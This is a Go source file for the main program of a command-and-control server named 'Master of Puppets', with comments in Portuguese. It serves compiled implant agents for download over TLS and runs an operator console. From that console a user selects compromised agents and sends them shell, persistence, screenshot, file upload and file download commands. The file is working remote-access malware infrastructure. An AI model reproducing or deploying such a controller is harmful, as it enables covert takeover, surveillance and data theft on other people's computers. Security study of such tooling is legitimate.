package main

import (
	"MoP/src/commands"
	"MoP/src/config"
	"MoP/src/controllers"
	"MoP/src/db"
	"MoP/src/messages"
	"MoP/src/middlewares"
	"MoP/src/router"
	"bufio"
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

var (
	term          = fmt.Sprintf("[[ Master of Puppets %s ]]>>> ", config.Load().Hostname)
	selectedAgent = ""
)

func init() {
	db.CheckDB()
}

func main() {
	// carrega as configs
	config := config.Load()
	// carrega as rotas do pacote router
	r := router.Generate()
	// rota para o file server que conterá os agentes compilados
	r.PathPrefix("/downloads/").Handler(http.StripPrefix("/downloads/", http.FileServer(http.Dir("../agents"))))

	messages.Banner(config.Hostname)

	go killAgent()
	go cli()

	cfg := &tls.Config{
		MinVersion:               tls.VersionTLS12,
		CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		},
	}

	srv := &http.Server{
		Addr:         fmt.Sprintf(":%d", config.Port),
		Handler:      r,
		TLSConfig:    cfg,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
	}

	err := srv.ListenAndServeTLS("resources/server.crt", "resources/server.key")
	if err != nil {
		messages.ErrorMessage("spawn the server", err)
		os.Exit(0)
	}

}

// mata agente após 10 minutos sem comunicação
func killAgent() {
	for {
		ids := controllers.AgentsToKill()

		for _, id := range ids {
			resp := controllers.KillAgent(id)
			fmt.Println(resp)
		}

		time.Sleep(time.Duration(10) * time.Minute)
	}
}

// cli no terminal
func cli() {
	for {

		if selectedAgent != "" {
			messages.RedBold.Print(term)
		} else {
			messages.BlueBold.Print(term)
		}
		// le os comandos inputados
		command, _ := bufio.NewReader(os.Stdin).ReadString('\n')

		// separa o comando em partes
		slicedCommand := middlewares.SliceCommand(command)
		// captura a palavra chave do comando
		baseCommand := slicedCommand[0]

		if len(baseCommand) > 0 {
			if string(baseCommand[0]) == "!" {
				hostCommand := strings.Replace(command, "!", "", 1)
				if runtime.GOOS == "windows" {
					output, _ := exec.Command("powershell.exe", "/C", hostCommand).CombinedOutput()
					fmt.Println(string(output))
				} else {
					output, _ := exec.Command("/bin/sh", "-c", hostCommand).CombinedOutput()
					fmt.Println(string(output))
				}
			} else {
				switch baseCommand {
				case "exit":
					if selectedAgent != "" {
						selectedAgent = ""
						term = fmt.Sprintf("[[ Master of Puppets %s ]]>>> ", config.Load().Hostname)
					} else {
						messages.OkMessage("Good Bye!")
						os.Exit(0)
					}
				case "help":
					fmt.Println(commands.Help())
				case "alias":
					// handler para as variações do comando show do pacote commands
					if selectedAgent != "" {
						commands.SetAlias(slicedCommand, selectedAgent)
					} else {
						messages.SelectAgentMessage()
					}
				case "build":
					var agentName string
					agentName = "agent"
					if len(slicedCommand) > 1 {
						agentName = slicedCommand[1]
					}

					commands.BuildAgents(agentName, config.Load().Hostname)
				case "show":
					// handler para as variações do comando show do pacote commands
					commands.ShowHandler(slicedCommand, selectedAgent)

				case "select":
					// seleciona um agente com a validação do pacote commands
					selectedAgent = commands.SelectHandler(slicedCommand)
					if selectedAgent != "" {
						term = fmt.Sprintf("[[ Agent %s ]]>># ", selectedAgent)
					} else {
						term = fmt.Sprintf("[[ Master of Puppets %s ]]>>> ", config.Load().Hostname)
					}
				case "upload":
					if selectedAgent != "" {
						commands.UploadFile(selectedAgent, slicedCommand)
						commands.CommandHandler(selectedAgent, command)
					} else {
						messages.SelectAgentMessage()
					}
				case "download":
					if selectedAgent != "" {
						commands.DownloadFile(selectedAgent, slicedCommand)
						commands.CommandHandler(selectedAgent, command)
					} else {
						messages.SelectAgentMessage()
					}
				case "screenshot":
					if selectedAgent != "" {
						commands.TakeScrenshot(selectedAgent, slicedCommand)
						commands.CommandHandler(selectedAgent, command)
					} else {
						messages.SelectAgentMessage()
					}
				case "persist":
					if selectedAgent != "" {
						commands.CommandHandler(selectedAgent, command)
					} else {
						messages.SelectAgentMessage()
					}
				case "shell":
					if selectedAgent != "" {
						commands.CommandHandler(selectedAgent, command)
						commands.Shell(selectedAgent, slicedCommand)
					} else {
						messages.SelectAgentMessage()
					}
				default:
					if selectedAgent != "" {
						commands.CommandHandler(selectedAgent, command)
					} else {
						messages.SelectAgentMessage()
					}

				}
			}
		}

	}

}
